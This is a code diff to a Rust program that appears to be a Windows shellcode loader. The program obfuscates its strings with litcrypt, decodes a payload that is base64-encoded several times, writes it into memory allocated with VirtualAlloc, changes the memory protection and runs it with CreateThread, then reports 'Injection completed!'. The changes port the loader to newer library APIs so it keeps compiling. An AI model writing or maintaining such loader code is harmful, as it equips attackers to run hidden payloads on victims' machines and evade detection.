@@ -7,9 +7,9 @@ extern crate litcrypt;
 use std::ptr;
 use std::ffi::c_void;
 use reqwest::Client;
-use base64::decode;
+use base64::{Engine as _, engine::general_purpose};
 use windows::{
-    Win32::Foundation::{BOOL, GetLastError},
+    Win32::Foundation::{BOOL, GetLastError, WIN32_ERROR},
     Win32::System::Memory::{
         VirtualAlloc, 
         VirtualProtect, 
@@ -41,7 +41,7 @@ const B64_ITERATIONS: usize = 3;
 fn decode_shellcode(sc: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
     let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
     for _i in 0..b64_iterations {
-        match decode(shellcode_vec) {
+        match general_purpose::STANDARD.decode(shellcode_vec) {
             Ok(d) => {
                 shellcode_vec = d
                     .into_iter()
@@ -123,7 +123,7 @@ async fn main() {
 
         unsafe {
             let base_addr = VirtualAlloc(
-                ptr::null_mut(),
+                Some(ptr::null_mut()),
                 shellcode.len(),
                 MEM_COMMIT | MEM_RESERVE,
                 PAGE_READWRITE,
@@ -163,12 +163,12 @@ async fn main() {
             let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };
 
             let h_thread = CreateThread(
-                ptr::null_mut(),
+                Some(ptr::null_mut()),
                 0,
                 Some(ep),
-                ptr::null_mut(),
+                Some(ptr::null_mut()),
                 THREAD_CREATION_FLAGS(0),
-                &mut tid,
+                Some(&mut tid),
             ).unwrap();
 
             if h_thread.is_invalid() {
@@ -177,7 +177,7 @@ async fn main() {
                 println!("Thread Id: {tid}");
             }
             
-            if WaitForSingleObject(h_thread, INFINITE) == 0 {
+            if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
                println!("{}", lc!("Good!"));
                println!("{}", lc!("Injection completed!"));
             } else {
